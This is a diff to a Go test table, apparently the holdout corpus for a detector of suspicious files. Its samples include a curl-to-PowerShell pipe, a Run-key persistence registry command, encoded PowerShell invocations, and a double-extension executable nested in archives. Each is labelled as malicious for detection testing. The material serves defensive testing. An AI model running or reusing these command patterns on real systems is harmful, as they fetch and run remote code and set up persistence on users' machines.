@@ -36,7 +36,7 @@ func TestStage3HoldoutCorpus(t *testing.T) {
   {"curl to interpreter","e.cmd",[]byte("curl https://example.invalid/unused | powershell.exe"),true},
   {"Run key persistence","f.cmd",[]byte(`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Example /t REG_SZ /d "example.exe"`),true},
   {"alternate encoded command","g.cmd",[]byte("powershell.exe -en AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),true},
-  {"shortcut-like encoded content","h.lnk",[]byte("powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),true},
+  {"shortcut-like encoded content","h.lnk",stage7LNKFixture("powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),true},
   {"nested archive","i.zip",stage3Archive(t,map[string][]byte{"inside.zip":stage3Archive(t,map[string][]byte{"document.pdf.exe":[]byte("inert")})}),true},
   {"triple nested archive","j.zip",stage3Archive(t,map[string][]byte{"inside.zip":nested}),true},
   {"benign download","normal1.ps1",[]byte("Invoke-WebRequest https://example.invalid/a -OutFile x.txt"),false},
